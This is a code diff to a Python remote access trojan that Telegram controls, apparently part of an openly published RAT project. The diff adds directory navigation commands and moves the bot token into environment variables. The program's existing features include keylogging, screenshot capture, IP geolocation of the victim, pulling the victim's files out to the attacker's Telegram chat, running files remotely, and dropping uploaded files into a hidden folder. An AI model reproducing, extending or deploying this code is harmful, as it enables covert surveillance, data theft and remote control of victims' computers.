@@ -11,13 +11,15 @@ import telepot, requests
 import os, os.path, platform, ctypes
 import pyHook, pythoncom
 me = singleton.SingleInstance()
-# REPLACE '1234:abcd' BY THE TOKEN OF THE BOT YOU GENERATED!
-token = '1234:abcd'
-# ADD YOUR chat_id TO THE LIST BELOW!
+# REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
+#token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
+token = os.environ['RAT_TOKEN'] # you can set your environment variable as well
+# ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
 known_ids = []
+known_ids.append(os.environ['TELEGRAM_CHAT_ID']) # make sure to remove this line if you don't have this environment variable
 def checkchat_id(chat_id):
 	# COMMENT THE LINE below if you want this to work just for your telegram id!
-	return True
+	#return True
 	try:
 		return str(chat_id) in known_ids
 	except:
@@ -71,7 +73,7 @@ def handle(msg):
 	chat_id = msg['chat']['id']
 	print 'Got message from ' + str(chat_id) + ': ' + msg['text']
 	if checkchat_id(chat_id):
-		functionalities = ['/capture_pc', '/to', '/play', '/keylogs', '/pc_info', '/msg_box', '/ip_info', '/download_file', '/list_dir', '/run_file', '/self_destruct']
+		functionalities = ['/capture_pc', '/cd', '/pwd', '/to', '/play', '/keylogs', '/pc_info', '/msg_box', '/ip_info', '/download', '/ls', '/run_file', '/self_destruct'] # turn into dictionary?
 		if 'text' in msg:
 			command = msg['text']
 			response = ''
@@ -83,6 +85,15 @@ def handle(msg):
 				bot.sendChatAction(chat_id, 'upload_photo')
 				bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
 				os.remove('screenshot.jpg')
+			elif command.startswith('/cd'):
+				command = command.replace('/cd ','')
+				try:
+					os.chdir(command)
+					response = os.getcwd() + '>'
+				except:
+					response = 'No subfolder matching ' + command
+			elif command == '/pwd':
+				response = os.getcwd()
 			elif command.startswith('/to'):
 				command = command.replace('/to ','')
 				targets = command[:command.index('/')]
@@ -121,34 +132,27 @@ def handle(msg):
 				response = info
 				location = (loads(info)['loc']).split(',')
 				bot.sendLocation(chat_id, location[0], location[1])
-			elif command.startswith('/download_file'):
-				path_file = command.replace('/download_file', '')
+			elif command.startswith('/download'):
+				bot.sendChatAction(chat_id, 'typing')
+				path_file = command.replace('/download', '')
 				path_file = path_file[1:]
 				if path_file == '':
-					bot.sendChatAction(chat_id, 'typing')
-					response = '/download_file C:/path/to/file'
+					# bot.sendChatAction(chat_id, 'typing')
+					response = '/download C:/path/to/file.name or /download file.name'
 				else:
 					try:
 						bot.sendChatAction(chat_id, 'upload_document')
 						bot.sendDocument(chat_id, open(path_file, 'rb'))
 					except:
-						response = 'Could not find file'
-			elif command.startswith('/list_dir'):
+						response = 'Could not find ' + path_file
+			elif command == '/ls':
 				bot.sendChatAction(chat_id, 'typing')
-				path_dir = command.replace('/list_dir', '')
-				path_dir = path_dir[1:]
-				if path_dir == '':
-					response = '/list_dir C:/path/to/folder'
-				else:
-					try:
-						files = os.listdir(path_dir)
-						human_readable = ''
-						for file in files:
-							human_readable += file + '\n'
-						human_readable += human_readable + '\n^Contents of ' + path_dir
-						response = human_readable
-					except:
-						response = 'Invalid path'
+				files = os.listdir(os.getcwd())
+				human_readable = ''
+				for file in files:
+					human_readable += file + '\n'
+				human_readable += human_readable + '\n'
+				response = human_readable
 			elif command.startswith('/run_file'):
 				bot.sendChatAction(chat_id, 'typing')
 				path_file = command.replace('/run_file', '')
@@ -178,8 +182,12 @@ def handle(msg):
 					sleep(10)
 			elif command == '/help':
 				response = "\n".join(str(x) for x in functionalities)
-			bot.sendMessage(chat_id, response)
-		else:
+			else: # redirect to /help
+				msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
+				handle(msg)
+			if response != '':
+				bot.sendMessage(chat_id, response)
+		else:# Upload a file to target
 			file_name = msg['document']['file_name']
 			file_id = msg['document']['file_id']
 			file_path = bot.getFile(file_id=file_id)['file_path']
@@ -187,6 +195,7 @@ def handle(msg):
 			file = (requests.get(link, stream=True)).raw
 			with open(hide_folder + '\\' + file_name, 'wb') as out_file:
 				copyfileobj(file, out_file)
+			response = 'File received succesfully.'
 bot = telepot.Bot(token)
 bot.message_loop(handle)
 if len(known_ids) > 0:
